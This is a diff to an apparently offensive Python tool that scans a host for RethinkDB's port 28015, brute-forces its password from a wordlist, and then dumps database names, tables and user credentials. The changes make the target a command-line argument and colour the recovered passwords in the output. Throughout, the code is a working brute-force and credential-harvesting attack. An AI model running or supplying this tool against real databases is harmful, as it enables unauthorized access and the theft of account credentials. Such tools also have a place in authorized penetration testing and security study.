@@ -1,7 +1,7 @@
 import nmap
 from rethinkdb import RethinkDB
 import sys
-import os
+import time
 
 def check_port_open(target, port):
     nm = nmap.PortScanner()
@@ -24,7 +24,7 @@ def ask_for_wordlist_path():
     return user_input
 
 def brute_force_password(target, wordlist_path):
-    print("Attempting brute force...")
+    print("\nAttempting brute force...")
     with open(wordlist_path, 'r', errors='ignore') as custom_file:
         for custom_line in custom_file:
             custom_password = custom_line.strip()
@@ -37,8 +37,9 @@ def brute_force_password(target, wordlist_path):
 
 def get_rethinkdb_databases(target, password):
     r = RethinkDB()
-    print("Password found:", password)
+    print(f"Password found: \033[91m{password}\033[0m")
     print("Logging in...")
+    time.sleep(2)
     conn = r.connect(host=target, port=28015, password=password)
 
     databases = r.db_list().run(conn)
@@ -55,7 +56,9 @@ def get_rethinkdb_databases(target, password):
                     username = document.get('id', 'N/A')
                     user_password = document.get('password', 'N/A')
                     if db=='rethinkdb' and username=='admin':
-                        print(f"        Username: {username}, Password: {password}")
+                        print(f"        Username: \033[91m{username}\033[0m Password: \033[91m{password}\033[0m")
+                    elif user_password==True:
+                        print(f"        Username: {username}, Password: HIDDEN")
                     else:
                         print(f"        Username: {username}, Password: {user_password}")
 
@@ -71,21 +74,25 @@ def attempt_connection(target, password):
         return False
 
 if __name__ == "__main__":
-    target_address = "192.168.1.18"
+    if len(sys.argv) != 2:
+        print("Usage: python rethinkdb-enumerate.py <target>")
+        sys.exit(1)
+
+    target_address = sys.argv[1]
 
     check_port_result = check_port_open(target_address, 28015)
 
     if check_port_result:
-        user_input = input(f"The port 28015 is open. \nAttempt brute force? (y/n)? ").lower()
+        user_input = input(f"The port 28015 is OPEN. \n\nAttempt brute force? (y/n)? ").lower()
         if user_input == 'y' or user_input == 'Y':
             password_file = ask_for_wordlist_path()
             brute_force_password(target_address, password_file)
         elif user_input == 'n' or user_input == 'N':
-            print("Brute force aborted. Thank you.")
+            print("Brute force aborted.")
             sys.exit(0)
         else:
             print("Invalid input. Exiting.")
             sys.exit(1)
     else:
-        print(f"Port 28015 is not open on {target_address}. Unable to proceed with brute forcing.")
+        print(f"The port 28015 is CLOSED. Cannot proceed.")
         sys.exit(1)
